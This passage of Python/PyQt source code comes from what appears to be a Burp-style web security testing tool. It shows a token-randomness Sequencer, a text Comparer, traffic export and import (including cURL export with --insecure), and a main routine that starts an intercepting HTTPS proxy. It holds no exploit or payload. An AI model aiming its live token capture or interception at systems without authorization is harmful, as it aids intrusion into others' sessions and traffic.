        stats_f.addRow("Bits analysed:", self.seq_stat_bits)
        stats_f.addRow("Monobit test:", self.seq_stat_monobit)
        stats_f.addRow("Runs test:", self.seq_stat_runs)
        stats_f.addRow("Bit-level entropy:", self.seq_stat_entropy)
        stats_f.addRow("Char-level entropy:", self.seq_stat_chentropy)
        stats_f.addRow("Uniqueness:", self.seq_stat_unique)
        stats_f.addRow("Avg. token length:", self.seq_stat_avglen)
        stats_f.addRow("Common prefix len:", self.seq_stat_prefix)
        res_l.addWidget(stats_g)

        res_l.addWidget(self._section_header("Sample Tokens (first 5)"))
        self.seq_samples = QPlainTextEdit()
        self.seq_samples.setReadOnly(True)
        self.seq_samples.setFont(mono_font(9))
        self.seq_samples.setMaximumHeight(90)
        self.seq_samples.setStyleSheet(
            f"background:{T.BG};color:{T.TXT2};border:1px solid {T.BORDER};border-radius:6px;")
        res_l.addWidget(self.seq_samples)
        sp.addWidget(res_w)
        sp.setSizes([420, 480])
        root.addWidget(sp, 1)

        self._sequencer = None
        self._seq_last_result = None
        self.seq_start.clicked.connect(self._seq_start_capture)
        self.seq_stop.clicked.connect(self._seq_stop_capture)
        self.seq_copy_btn.clicked.connect(self._seq_copy_report)

        return w

    def _comparer_tab(self) -> QWidget:
        """Comparer — line-by-line diff of two arbitrary texts (paste a
        request, response, or anything else). Burp Pro's Comparer is one of
        its most-used tools for spotting exactly what changed between two
        payloads; this app already had the diff engine (Differ, above) and
        matching ADD_GREEN/DEL_RED/SAME_BG theme tokens built for exactly
        this, just never wired to a tab."""
        w = QWidget()
        root = QVBoxLayout(w)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        top = QWidget(); top.setFixedHeight(44)
        top.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        tl = QHBoxLayout(top); tl.setContentsMargins(12, 0, 12, 0); tl.setSpacing(8)
        title = QLabel("⚖ Comparer")
        title.setStyleSheet(f"color:{T.TXT1};font-size:13px;font-weight:700;")
        self.cmp_compare_btn = self._btn("Compare", "primary", h=30, w=110)
        self.cmp_swap_btn = self._btn("⇅ Swap", h=30)
        self.cmp_clear_btn = self._btn("Clear both", h=30)
        self.cmp_stats_lbl = QLabel("")
        self.cmp_stats_lbl.setStyleSheet(f"color:{T.TXT3};font-size:11px;")
        tl.addWidget(title)
        tl.addSpacing(12)
        tl.addWidget(self.cmp_compare_btn)
        tl.addWidget(self.cmp_swap_btn)
        tl.addWidget(self.cmp_clear_btn)
        tl.addStretch()
        tl.addWidget(self.cmp_stats_lbl)
        root.addWidget(top)

        sp = QSplitter(Qt.Orientation.Vertical)

        # ── Inputs: two side-by-side panes ──
        inputs_w = QWidget()
        inputs_l = QHBoxLayout(inputs_w)
        inputs_l.setContentsMargins(8, 8, 8, 4)
        inputs_l.setSpacing(8)

        def _make_pane(label_text):
            pane = QWidget()
            pv = QVBoxLayout(pane)
            pv.setContentsMargins(0, 0, 0, 0)
            pv.setSpacing(4)
            hdr = QHBoxLayout()
            lbl = QLabel(label_text)
            lbl.setStyleSheet(f"color:{T.TXT2};font-size:11px;font-weight:600;")
            paste_btn = self._btn("📋 Paste", h=22)
            hdr.addWidget(lbl); hdr.addStretch(); hdr.addWidget(paste_btn)
            edit = QPlainTextEdit()
            edit.setFont(mono_font(11))
            edit.setPlaceholderText("Paste or type text to compare…")
            pv.addLayout(hdr)
            pv.addWidget(edit, 1)
            paste_btn.clicked.connect(
                lambda: edit.setPlainText(QApplication.clipboard().text()))
            return pane, edit

        pane_a, self.cmp_text_a = _make_pane("Text A")
        pane_b, self.cmp_text_b = _make_pane("Text B")
        inputs_l.addWidget(pane_a)
        inputs_l.addWidget(pane_b)
        sp.addWidget(inputs_w)

        # ── Result ──
        result_w = QWidget()
        rv = QVBoxLayout(result_w)
        rv.setContentsMargins(8, 4, 8, 8)
        rv.setSpacing(4)
        rlbl = QLabel("Result")
        rlbl.setStyleSheet(f"color:{T.TXT2};font-size:11px;font-weight:600;")
        self.cmp_result = QTextBrowser()
        self.cmp_result.setReadOnly(True)
        self.cmp_result.setFont(mono_font(11))
        rv.addWidget(rlbl)
        rv.addWidget(self.cmp_result, 1)
        sp.addWidget(result_w)
        sp.setSizes([320, 360])
        root.addWidget(sp, 1)

        def _run_compare():
            import html
            a = self.cmp_text_a.toPlainText()
            b = self.cmp_text_b.toPlainText()
            rows = Differ.diff(a, b)
            added = sum(1 for op, _ in rows if op == '+')
            removed = sum(1 for op, _ in rows if op == '-')
            same = sum(1 for op, _ in rows if op == '=')
            self.cmp_stats_lbl.setText(
                f"{added} added   {removed} removed   {same} unchanged")
            bg_for = {'+': T.ADD_GREEN, '-': T.DEL_RED, '=': T.SAME_BG}
            fg_for = {'+': '#065f46' if not _DARK_MODE else '#6ee7b7',
                      '-': '#991b1b' if not _DARK_MODE else '#fca5a5',
                      '=': T.TXT2}
            prefix = {'+': '+ ', '-': '− ', '=': '  '}
            html_lines = []
            for op, line in rows:
                safe = html.escape(line) if line else '&nbsp;'
                html_lines.append(
                    f'<div style="background:{bg_for[op]};color:{fg_for[op]};'
                    f'white-space:pre;padding:1px 6px;">{prefix[op]}{safe}</div>')
            self.cmp_result.setHtml(''.join(html_lines) if html_lines else '')

        self.cmp_compare_btn.clicked.connect(_run_compare)
        self.cmp_swap_btn.clicked.connect(self._cmp_swap)
        self.cmp_clear_btn.clicked.connect(self._cmp_clear)

        return w

    def _cmp_swap(self):
        a = self.cmp_text_a.toPlainText()
        b = self.cmp_text_b.toPlainText()
        self.cmp_text_a.setPlainText(b)
        self.cmp_text_b.setPlainText(a)

    def _cmp_clear(self):
        self.cmp_text_a.clear()
        self.cmp_text_b.clear()
        self.cmp_result.clear()
        self.cmp_stats_lbl.setText("")

    def _seq_start_capture(self):
        url = self.seq_url.text().strip()
        if not url:
            QMessageBox.warning(self, "Sequencer", "Enter a target URL first.")
            return
        if not HAS_REQUESTS:
            QMessageBox.warning(self, "Sequencer",
                                 "The 'requests' package is required for live capture.\n\npip install requests")
            return
        headers = {}
        for line in self.seq_headers.toPlainText().split('\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                if k.strip().lower() in ('host', 'content-length'):
                    continue
                headers[k.strip()] = v.strip()
        count = self.seq_count.value()

        self.seq_start.setEnabled(False)
        self.seq_stop.setEnabled(True)
        self.seq_copy_btn.setEnabled(False)
        self.seq_prog.setVisible(True)
        self.seq_prog.setMinimum(0)
        self.seq_prog.setMaximum(count)
        self.seq_prog.setValue(0)
        self.seq_status_lbl.setText(f"Capturing… 0 / {count}")
        self.seq_live.clear()
        self.seq_samples.clear()
        self.seq_grade_lbl.setText("—")
        self.seq_grade_lbl.setStyleSheet(
            f"color:{T.TXT3};font-size:20px;font-weight:800;padding:10px;"
            f"background:{T.SURFACE};border:1px solid {T.BORDER};border-radius:8px;")
        for lbl in (self.seq_stat_count, self.seq_stat_bits, self.seq_stat_monobit,
                    self.seq_stat_runs, self.seq_stat_entropy, self.seq_stat_chentropy,
                    self.seq_stat_unique, self.seq_stat_avglen, self.seq_stat_prefix):
            lbl.setText("—")

        self._sequencer = Sequencer(
            url=url, param=self.seq_param.text().strip(),
            method=self.seq_method.currentText(), count=count,
            extra_headers=headers, post_body=self.seq_body.toPlainText())
        self._sequencer.sample_ready.connect(self._seq_on_sample)
        self._sequencer.analysis_done.connect(self._seq_on_analysis_done)
        self._sequencer.error.connect(self._seq_on_error)
        self._sequencer.start()
        self._log(f"[Sequencer] Capturing {count} tokens from {url} "
                  f"(param: {self.seq_param.text().strip() or 'auto'})")

    def _seq_stop_capture(self):
        if self._sequencer is not None:
            self._sequencer.stop()
        self.seq_start.setEnabled(True)
        self.seq_stop.setEnabled(False)
        self.seq_status_lbl.setText("Stopped")
        self._log("[Sequencer] Capture stopped by user")

    def _seq_on_sample(self, n: int, tok: str):
        self.seq_prog.setValue(n)
        self.seq_status_lbl.setText(f"Capturing… {n} / {self.seq_count.value()}")
        short = tok if len(tok) <= 70 else tok[:67] + "…"
        self.seq_live.appendPlainText(f"#{n:<4} {short}")

    def _seq_on_analysis_done(self, result: dict):
        self.seq_start.setEnabled(True)
        self.seq_stop.setEnabled(False)
        if "error" in result:
            self.seq_status_lbl.setText("Error")
            QMessageBox.information(self, "Sequencer", result["error"])
            self._log(f"[Sequencer] {result['error']}")
            return
        self.seq_status_lbl.setText("Capture complete")
        self.seq_copy_btn.setEnabled(True)
        self._seq_last_result = result
        grade = result.get("grade", "—")
        color = (T.GREEN if grade.startswith("A") else
                 T.CYAN if grade.startswith("B") else
                 T.YELLOW if grade.startswith(("C", "D")) else
                 T.RED)
        self.seq_grade_lbl.setText(grade)
        self.seq_grade_lbl.setStyleSheet(
            f"color:{color};font-size:20px;font-weight:800;padding:10px;"
            f"background:{T.SURFACE};border:1px solid {color};border-radius:8px;")
        self.seq_stat_count.setText(str(result.get("count", 0)))
        self.seq_stat_bits.setText(str(result.get("bits", 0)))
        self.seq_stat_monobit.setText("✅ Pass" if result.get("monobit_pass") else "❌ Fail")
        self.seq_stat_runs.setText(
            f"{'✅ Pass' if result.get('runs_pass') else '❌ Fail'}  "
            f"({result.get('runs', 0)} vs {result.get('expected_runs', 0)} expected)")
        self.seq_stat_entropy.setText(f"{result.get('entropy_bits', 0)} bits/bit  (ideal = 1.0)")
        self.seq_stat_chentropy.setText(f"{result.get('char_entropy', 0)} bits/char")
        self.seq_stat_unique.setText(f"{result.get('unique_pct', 0)}%")
        self.seq_stat_avglen.setText(f"{result.get('avg_length', 0)} chars")
        self.seq_stat_prefix.setText(f"{result.get('common_prefix_len', 0)} chars")
        self.seq_samples.setPlainText("\n".join(result.get("sample_tokens", [])))
        self._log(f"[Sequencer] Analysis complete — {grade} "
                  f"({result.get('count', 0)} tokens, {result.get('bits', 0)} bits)")

    def _seq_on_error(self, msg: str):
        self.seq_start.setEnabled(True)
        self.seq_stop.setEnabled(False)
        self.seq_status_lbl.setText("Error")
        self._log(f"[Sequencer] Error: {msg}")
        QMessageBox.warning(self, "Sequencer", msg)

    def _seq_copy_report(self):
        r = self._seq_last_result
        if not r:
            return
        report = (
            f"Kingception Sequencer Report\n"
            f"Target: {self.seq_url.text().strip()}\n"
            f"Parameter: {self.seq_param.text().strip() or 'auto'}\n"
            f"Grade: {r.get('grade')}\n"
            f"Tokens collected: {r.get('count')}\n"
            f"Bits analysed: {r.get('bits')}\n"
            f"Monobit test: {'Pass' if r.get('monobit_pass') else 'Fail'}\n"
            f"Runs test: {'Pass' if r.get('runs_pass') else 'Fail'} "
            f"({r.get('runs')} vs {r.get('expected_runs')} expected)\n"
            f"Bit-level entropy: {r.get('entropy_bits')} bits/bit\n"
            f"Char-level entropy: {r.get('char_entropy')} bits/char\n"
            f"Uniqueness: {r.get('unique_pct')}%\n"
            f"Avg token length: {r.get('avg_length')} chars\n"
            f"Common prefix length: {r.get('common_prefix_len')} chars\n")
        QApplication.clipboard().setText(report)
        self._log("[Sequencer] Report copied to clipboard")

    def _export_json(self):
        """Export captured traffic to JSON."""
        path, _ = QFileDialog.getSaveFileName(
            self, "Export JSON", "kingception_traffic.json", "JSON (*.json);;All (*.*)")
        if not path:
            return
        msgs = [
            {
                "id": m.get("id",""),
                "ts": m.get("ts", 0),
                "method": m.get("method",""),
                "url": m.get("url",""),
                "host": m.get("host",""),
                "path": m.get("path",""),
                "scheme": m.get("scheme",""),
                "status": m.get("status", 0),
                "duration": round(m.get("dur", 0), 4),
                "resp_size": m.get("resp_size", 0),
                "content_type": m.get("content_type",""),
                "req_headers": m.get("req_headers") or {},
                "req_body": decode_body(m.get("req_body")),
                "resp_headers": m.get("resp_headers") or {},
                "resp_body": decode_body(m.get("resp_body")),
            }
            for m in self.db.recent
        ]
        with open(path, "w", encoding="utf-8") as f:
            json.dump(msgs, f, indent=2, ensure_ascii=False, default=str)
        self._log(f"Exported {len(msgs)} requests → {path}")

    def _export_csv(self):
        """Export captured traffic to CSV."""
        import csv as _csv
        path, _ = QFileDialog.getSaveFileName(
            self, "Export CSV", "kingception_traffic.csv", "CSV (*.csv);;All (*.*)")
        if not path:
            return
        msgs = list(self.db.recent)
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = _csv.writer(f)
            w.writerow(["#","Method","Host","Path","Status","Size (B)",
                        "Duration (s)","Content-Type","URL"])
            for i, m in enumerate(msgs, 1):
                w.writerow([
                    i,
                    m.get("method",""),
                    m.get("host",""),
                    m.get("path",""),
                    m.get("status",""),
                    m.get("resp_size", 0),
                    round(m.get("dur", 0), 3),
                    m.get("content_type",""),
                    m.get("url",""),
                ])
        self._log(f"Exported {len(msgs)} rows → {path}")

    def _export_curl(self):
        """Export captured requests as cURL commands."""
        path, _ = QFileDialog.getSaveFileName(
            self, "Export cURL", "kingception_curl.sh", "Shell (*.sh);;Text (*.txt);;All (*.*)")
        if not path:
            return
        import shlex
        lines = ["#!/usr/bin/env bash", "# Kingception cURL export", ""]
        for m in self.db.recent:
            url     = m.get("url","")
            method  = m.get("method","GET")
            headers = m.get("req_headers") or {}
            body    = decode_body(m.get("req_body"))
            cmd     = f"curl -X {method} {shlex.quote(url)}"
            for k, v in headers.items():
                if k.lower() in ("host","content-length","transfer-encoding"):
                    continue
                cmd += f" \\\n     -H {shlex.quote(f'{k}: {v}')}"
            if body:
                cmd += f" \\\n     -d {shlex.quote(body)}"
            cmd += " \\\n     --insecure"
            lines.append(cmd)
            lines.append("")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        self._log(f"Exported {len(self.db.recent)} cURL commands → {path}")

    def _import_json(self):
        """Import a previously exported JSON traffic dump."""
        path, _ = QFileDialog.getOpenFileName(
            self, "Import JSON", "", "JSON (*.json);;All (*.*)")
        if not path:
            return
        try:
            with open(path, "r", encoding="utf-8") as f:
                msgs = json.load(f)
            if not isinstance(msgs, list):
                raise ValueError("Expected a JSON array of messages")
            imported = 0
            for m in msgs:
                if not isinstance(m, dict) or "url" not in m:
                    continue
                self.db.recent.append(m)
                # Add to traffic tree
                n = self.proxy_tree.topLevelItemCount() + 1
                item = QTreeWidgetItem()
                item.setText(0, str(n))
                item.setText(1, m.get("method",""))
                item.setText(2, m.get("host",""))
                item.setText(3, m.get("path", m.get("url",""))[:120])
                item.setText(4, str(m.get("status","")))
                item.setText(5, pretty_size(m.get("resp_size",0)))
                item.setText(6, f"{m.get('duration',0):.2f}s")
                item.setText(7, m.get("content_type","")[:40])
                item.setForeground(1, QBrush(QColor(method_color(m.get("method","")))))
                item.setForeground(4, QBrush(QColor(status_color(m.get("status",0)))))
                item.setData(0, Qt.ItemDataRole.UserRole, m.get("id",""))
                self.proxy_tree.addTopLevelItem(item)
                imported += 1
            if hasattr(self, "_traffic_count_lbl"):
                self._traffic_count_lbl.setText(
                    f"{self.proxy_tree.topLevelItemCount()} requests")
            self._log(f"Imported {imported} requests from {path}")
            QMessageBox.information(self, "Import Complete",
                                    f"Imported {imported} requests.")
        except Exception as ex:
            QMessageBox.critical(self, "Import Failed", str(ex))
            self._log(f"Import error: {ex}")

    def closeEvent(self, e):
        self._save_settings()
        if self.proxy.is_running:
            self.proxy.stop()
        if self._collab.running:
            self._collab.stop()
        e.accept()
# ========== MAIN ==========
def main():
    print("\n" + "═" * 70)
    print("  ⚡  Kingception v1.0  —  Burp‑style Security Suite  [Dark Edition]")
    print("═" * 70)
    missing = []
    if not HAS_REQUESTS:
        missing.append("requests")
    if not HAS_CRYPTO:
        missing.append("cryptography")
    if not HAS_JWT:
        missing.append("pyjwt")
    if missing:
        print("  Install missing packages:")
        print(f"    pip install {' '.join(missing)}")
        if not HAS_CRYPTO:
            print("  ⚠ Without cryptography: HTTPS MITM not available (tunneling only)")
    print("\n  Starting GUI – proxy auto‑started on 127.0.0.1:8080\n")
    app = QApplication(sys.argv)
    app.setApplicationName("Kingception v1.0")
    app.setWindowIcon(app_icon())
    app.setStyle("Fusion")
    app.setStyleSheet(CSS)
    w = MainWindow()
    w.show()
    sys.exit(app.exec())

if __name__ == "__main__":
    main()